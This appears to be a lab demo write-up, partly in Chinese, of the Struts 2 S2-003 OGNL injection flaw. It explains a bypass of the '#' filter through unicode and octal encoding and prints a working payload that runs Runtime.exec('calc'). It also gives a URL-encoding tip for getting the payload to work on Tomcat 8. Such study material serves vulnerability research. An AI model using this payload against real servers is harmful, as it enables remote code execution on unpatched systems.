# S2-003 Demo

## Summary

| Who should read this    | All Struts 2 developers                                      |
| :---------------------- | ------------------------------------------------------------ |
| Impact of vulnerability | Remote server context manipulation                           |
| Maximum security rating | Critical                                                     |
| Recommendation          | Developers should immediately upgrade to Struts 2.2.1 or later |
| Affected Software       | Struts 2.0.0 - Struts 2.1.8.1                                |
| Original JIRA Ticket    | [XW-641](http://jira.opensymphony.com/browse/XW-641), [WW-2692](http://issues.apache.org/struts/browse/WW-2692) |
| Reporter                | Meder Kydyraliev, Google Security Team                       |

## Problem

Ognl的上下文对象必须要使用#符号，Struts2虽然对#号进行过滤，但是没有考虑到编码情况，导致可以用unicode编码\u0023或者八进制\43绕过。

## Environment

| Struts2 Version | struts-2.0.11.2        |
| --------------- | ---------------------- |
| Server          | Tomcat 6.0.9           |
| IDE             | idea 2020.1.1 ULTIMATE |

## POC

![{15189529-560B-45EC-9D26-EA6CEA8D80CC}_20200619162417](img/{15189529-560B-45EC-9D26-EA6CEA8D80CC}_20200619162417.jpg)

payload:

```java
?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(bla)(bla)&('\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\'calc\')')(bla)(bla)
```

vulhub有在tomcat8测试成功，大家可以试试：

> 网上一些POC放到tomcat8下会返回400，研究了一下发现字符`\`、`"`不能直接放path里，需要urlencode，编码以后再发送就好了。

## Reference

- [【Struts2-命令-代码执行漏洞分析系列】S2-003和S3-005](https://xz.aliyun.com/t/2323)

- [S2-005 远程代码执行漏洞](https://github.com/vulhub/vulhub/blob/master/struts2/s2-005/README.zh-cn.md)

* [S2-003](https://cwiki.apache.org/confluence/display/WW/S2-003)

